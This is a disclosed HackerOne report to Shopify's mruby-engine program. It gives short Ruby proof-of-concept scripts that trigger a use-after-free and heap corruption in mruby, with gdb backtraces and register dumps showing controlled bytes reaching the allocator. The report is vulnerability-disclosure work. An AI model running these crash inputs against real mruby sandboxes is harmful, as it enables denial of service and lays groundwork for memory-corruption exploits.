# SIGABRT, SIGSEGV mspace_free() and mrb_default_allocf()

## Report Details
- **Report ID**: 192532
- **URL**: https://hackerone.com/reports/192532
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-12-19T20:10:54.659Z
- **Disclosed**: 2017-03-01T21:25:42.899Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Sample - 1
---------------------

The following code triggers the bug (attached as mirb_use_after_free.rb):

	def method_missing(m)"0000000"end
	m0=w.instance_eval{prepend(m)}
	m0.instance_eval{prepend(m0)}

Crash - Use After Free
---------------------

	(gdb) r use_after_free 
	Starting program: /home/x/Desktop/research/mruby/bin/mirb use_after_free
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing
	 => "00000000000000"
	 => ""
	*** Error in `/home/x/Desktop/research/mruby/bin/mirb': free(): invalid next size (normal): 0x00000000007c5b30 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778e4ae in malloc_printerr (ptr=<optimized out>, str=0x7ffff7890b88 "free(): invalid next size (normal)", action=1) at malloc.c:4996
	#4  _int_free (av=<optimized out>, p=<optimized out>, have_lock=1) at malloc.c:3840
	#5  0x00007ffff77905bc in _int_realloc (av=0x7ffff7acd760 <main_arena>, oldp=0x7c5ab0, oldsize=<optimized out>, nb=<optimized out>) at malloc.c:4366
	#6  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x7c5ac0, bytes=95) at malloc.c:3029
	#7  0x000000000042321e in mrb_default_allocf (mrb=<optimized out>, p=<optimized out>, size=6, ud=<optimized out>) at /home/x/Desktop/research/mruby/src/state.c:60
	#8  0x000000000041b08d in mrb_realloc_simple (mrb=0x756010, p=0x7c5ac0, len=95) at /home/x/Desktop/research/mruby/src/gc.c:201
	#9  mrb_realloc (mrb=0x756010, p=0x7c5ac0, len=95) at /home/x/Desktop/research/mruby/src/gc.c:215
	#10 0x00000000004327f4 in resize_capa (mrb=0x756010, capacity=94, s=<optimized out>) at /home/x/Desktop/research/mruby/src/string.c:139
	#11 str_buf_cat (ptr=<optimized out>, len=<optimized out>, mrb=<optimized out>, s=<optimized out>) at /home/x/Desktop/research/mruby/src/string.c:174
	#12 mrb_str_cat (mrb=<optimized out>, str=..., ptr=<optimized out>, len=<optimized out>) at /home/x/Desktop/research/mruby/src/string.c:2564
	#13 0x0000000000433233 in mrb_str_inspect (mrb=<optimized out>, str=...) at /home/x/Desktop/research/mruby/src/string.c:2658
	#14 0x00000000004050ae in mrb_funcall_with_block (mrb=<optimized out>, self=..., mid=<optimized out>, argc=<optimized out>, argv=<optimized out>, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:415
	#15 0x00000000004046af in mrb_funcall_with_block (mrb=0x756010, self=..., mid=<optimized out>, argc=<optimized out>, argv=0x7fffffffc890, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:338
	#16 0x000000000040403a in mrb_funcall_argv (mrb=0x756010, self=<error reading variable: access outside bounds of object referenced via synthetic pointer>, mid=<optimized out>, argc=0, argv=0x7a6973207478656e)
	    at /home/x/Desktop/research/mruby/src/vm.c:432
	#17 mrb_funcall (mrb=<optimized out>, self=..., name=<optimized out>, argc=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:323
	#18 0x000000000040326d in p (mrb=<optimized out>, obj=<error reading variable: access outside bounds of object referenced via synthetic pointer>, prompt=1)
	    at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:92
	#19 main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:564

Sample - 2
---------------------

The following code triggers the bug (attached as memory_corruption.rb):

	def method_missing(m)"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"end
	m0=w.instance_eval{prepend(m)}
	m0.instance_eval{prepend(m0)}

Crash - Memory Corruption
---------------------

	(gdb) r ../../mruby-engine/bin/memory_corruption
	Starting program: /home/x/Desktop/research/mruby/bin/mirb ../../mruby-engine/bin/memory_corruption
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing
	 => "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"
	*** Error in `/home/x/Desktop/research/mruby/bin/mirb': malloc(): memory corruption: 0x00000000007c7720 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778fd76 in malloc_printerr (ptr=0x7c7720, str=0x7ffff788cb84 "malloc(): memory corruption", action=<optimized out>) at malloc.c:4996
	#4  _int_malloc (av=av@entry=0x7ffff7acd760 <main_arena>, bytes=bytes@entry=49) at malloc.c:3447
	#5  0x00007ffff7790621 in _int_realloc (av=0x7ffff7acd760 <main_arena>, oldp=0x7c5c70, oldsize=32, nb=64) at malloc.c:4286
	#6  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x7c5c80, bytes=47) at malloc.c:3029
	#7  0x000000000042321e in mrb_default_allocf (mrb=<optimized out>, p=<optimized out>, size=6, ud=<optimized out>) at /home/x/Desktop/research/mruby/src/state.c:60
	#8  0x000000000041b08d in mrb_realloc_simple (mrb=0x756010, p=0x7c5c80, len=47) at /home/x/Desktop/research/mruby/src/gc.c:201
	#9  mrb_realloc (mrb=0x756010, p=0x7c5c80, len=47) at /home/x/Desktop/research/mruby/src/gc.c:215
	#10 0x00000000004327f4 in resize_capa (mrb=0x756010, capacity=46, s=<optimized out>) at /home/x/Desktop/research/mruby/src/string.c:139
	#11 str_buf_cat (ptr=<optimized out>, len=<optimized out>, mrb=<optimized out>, s=<optimized out>) at /home/x/Desktop/research/mruby/src/string.c:174
	#12 mrb_str_cat (mrb=<optimized out>, str=..., ptr=<optimized out>, len=<optimized out>) at /home/x/Desktop/research/mruby/src/string.c:2564
	#13 0x0000000000433233 in mrb_str_inspect (mrb=<optimized out>, str=...) at /home/x/Desktop/research/mruby/src/string.c:2658
	#14 0x00000000004050ae in mrb_funcall_with_block (mrb=<optimized out>, self=..., mid=<optimized out>, argc=<optimized out>, argv=<optimized out>, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:415
	#15 0x00000000004046af in mrb_funcall_with_block (mrb=0x756010, self=..., mid=<optimized out>, argc=<optimized out>, argv=0x7fffffffc870, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:338
	#16 0x000000000040403a in mrb_funcall_argv (mrb=0x756010, self=<error reading variable: access outside bounds of object referenced via synthetic pointer>, mid=<optimized out>, argc=0, argv=0x726d2f6863726165)
	    at /home/x/Desktop/research/mruby/src/vm.c:432
	#17 mrb_funcall (mrb=<optimized out>, self=..., name=<optimized out>, argc=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:323
	#18 0x000000000040326d in p (mrb=<optimized out>, obj=<error reading variable: access outside bounds of object referenced via synthetic pointer>, prompt=1)
	    at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:92
	#19 main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:564

SANDBOX - SIGSEGV and Memory Corruption (SIGABRT)
---------------------

Attached as sandbox.log

	x@x:~/Desktop/research/mruby-engine/bin$ ./sandbox memory_corruption 
	: [BUG] Segmentation fault at 0x00000000000000
	ruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0001 p:1057346 s:0002 E:002210 TOP    [FINISH]


	-- Machine register context ------------------------------------------------
	 RIP: 0x00007fe1a9945d1a RBP: 0x00007fe1a84d63e0 RSP: 0x00007fff283ca870
	 RAX: 0x31313131313132d0 RBX: 0x00007fe1a84d6010 RCX: 0x3131313131313131
	 RDX: 0x00007fe1a851a000 RDI: 0x00007fe1a851a1a0 RSI: 0x3131313131313131
	  R8: 0x00007fe1a8501c50  R9: 0x00007fe1a84d6000 R10: 0x3131313131313131
	 R11: 0x0000000000000003 R12: 0x00007fe1a84d64e0 R13: 0x00007fe1a84d69c0
	 R14: 0x0000000000000000 R15: 0x00007fe1a84e29f0 EFL: 0x0000000000010202

	-- C level backtrace information -------------------------------------------
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7fe1ae051d55]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7fe1ae051f8c]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7fe1adf2e06b]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7fe1adfe414e]

Debug
---------------------

Attached as sandbox_gdb.log

	(gdb) r
	Starting program: /usr/bin/ruby sandbox memory_corruption
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	[New Thread 0x7ffff7ff7700 (LWP 13744)]
	[New Thread 0x7ffff1f73700 (LWP 13813)]
	[Thread 0x7ffff1f73700 (LWP 13813) exited]

	Program received signal SIGSEGV, Segmentation fault.
	0x00007ffff33e3d1a in mspace_free (msp=0x7ffff1f74010, mem=0x3131313131313131) at ../../../../ext/mruby_engine/dlmalloc.c:4250
	4250                unlink_chunk(fm, next, nsize);
	(gdb) info reg
	rax            0x31313131313132d0 3544668469065757392	*****Overflow*****
	rbx            0x7ffff1f74010 140737252900880
	rcx            0x3131313131313131 3544668469065756977	*****Overflow*****
	rdx            0x7ffff1fb8000 140737253179392
	rsi            0x3131313131313131 3544668469065756977	*****Overflow*****
	rdi            0x7ffff1fb81a0 140737253179808
	rbp            0x7ffff1f743e0 0x7ffff1f743e0
	rsp            0x7fffffffd8c0 0x7fffffffd8c0
	r8             0x7ffff1f9fc50 140737253080144
	r9             0x7ffff1f74000 140737252900864
	r10            0x3131313131313131 3544668469065756977	*****Overflow*****
	r11            0x3  3
	r12            0x7ffff1f744e0 140737252902112
	r13            0x7ffff1f749c0 140737252903360
	r14            0x0  0
	r15            0x7ffff1f809f0 140737252952560
	rip            0x7ffff33e3d1a 0x7ffff33e3d1a <mspace_free+426>
	eflags         0x10202  [ IF RF ]
	cs             0x33 51
	ss             0x2b 43
	ds             0x0  0
	es             0x0  0
	fs             0x0  0
	gs             0x0  0
	(gdb) c
	Continuing.
	sandbox: [BUG] Segmentation fault at 0x00000000000000
	ruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0001 p:0000 s:0002 E:0008f0 TOP    [FINISH]


	-- Machine register context ------------------------------------------------
	 RIP: 0x00007ffff33e3d1a RBP: 0x00007ffff1f743e0 RSP: 0x00007fffffffd8c0
	 RAX: 0x31313131313132d0 RBX: 0x00007ffff1f74010 RCX: 0x3131313131313131
	 RDX: 0x00007ffff1fb8000 RDI: 0x00007ffff1fb81a0 RSI: 0x3131313131313131
	  R8: 0x00007ffff1f9fc50  R9: 0x00007ffff1f74000 R10: 0x3131313131313131
	 R11: 0x0000000000000003 R12: 0x00007ffff1f744e0 R13: 0x00007ffff1f749c0
	 R14: 0x0000000000000000 R15: 0x00007ffff1f809f0 EFL: 0x0000000000010202

	-- C level backtrace information -------------------------------------------
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7ffff7aefd55]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7ffff7aeff8c]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7ffff79cc06b]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7ffff7a8214e]
	/lib/x86_64-linux-gnu/libc.so.6 [0x7ffff75ccff0]

	...
	...
	...
	...

	[NOTE]
	You may have encountered a bug in the Ruby interpreter or extension libraries.
	Bug reports are welcome.
	For details: http://www.ruby-lang.org/bugreport.html


	Program received signal SIGABRT, Aborted.
	0x00007ffff75ccf79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56  ../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) c
	Continuing.
	[Thread 0x7ffff7ff7700 (LWP 13744) exited]

	Program terminated with signal SIGABRT, Aborted.
	The program no longer exists.

Backtrace
---------------------

	(gdb) bt
	#0  0x00007ffff75ccf79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff75d0388 in __GI_abort () at abort.c:89
	#2  0x00007ffff79cc078 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2
	#3  0x00007ffff7a8214e in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2
	#4  <signal handler called>
	#5  0x00007ffff33e3d1a in mspace_free (msp=0x7ffff1f74010, mem=0x3131313131313131) at ../../../../ext/mruby_engine/dlmalloc.c:4250
	#6  0x00007ffff33dcc38 in me_memory_pool_free (self=<optimized out>, block=<optimized out>) at ../../../../ext/mruby_engine/memory_pool.c:90
	#7  0x00007ffff33dcf56 in mruby_engine_allocf (state=<optimized out>, block=<optimized out>, size=0, data=0x7ffff1f743e0) at ../../../../ext/mruby_engine/mruby_engine.c:63
	#8  0x00007ffff33f4cf3 in obj_free (obj=0x7ffff1f7c0a0, mrb=0x7ffff1f744e0) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/gc.c:786
	#9  free_heap (mrb=mrb@entry=0x7ffff1f744e0, gc=gc@entry=0x7ffff1f745b8) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/gc.c:384
	#10 0x00007ffff33f4e71 in mrb_gc_destroy (mrb=0x7ffff1f744e0, gc=0x7ffff1f745b8) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/gc.c:393
	#11 0x00007ffff33f981a in mrb_close (mrb=0x7ffff1f744e0) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/state.c:251
	#12 0x00007ffff33dd3c5 in me_mruby_engine_destroy (self=self@entry=0x7ffff1f743e0) at ../../../../ext/mruby_engine/mruby_engine.c:199
	#13 0x00007ffff33e011e in ext_mruby_engine_free (engine=0x7ffff1f743e0) at ../../../../ext/mruby_engine/ext.c:51
	#14 0x00007ffff79e3624 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2
	#15 0x00007ffff79eca89 in rb_gc_call_finalizer_at_exit () from /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2
	#16 0x00007ffff79d2d2f in ruby_cleanup () from /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2
	#17 0x00007ffff79d2f35 in ruby_run_node () from /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2
	#18 0x000000000040086b in ?? ()
	#19 0x00007ffff75b7ec5 in __libc_start_main (main=0x400820, argc=3, argv=0x7fffffffdf58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf48) at libc-start.c:287
	#20 0x0000000000400899 in _start ()


Impact
---------------------

This vulnerability is caused by use after free and memory corruption error. It becomes DoS because it collapses with the whole thread.


## Attachments
- mirb_use_after_free.rb
- memory_corruption.rb
- sandbox.log
- sandbox_gdb.log
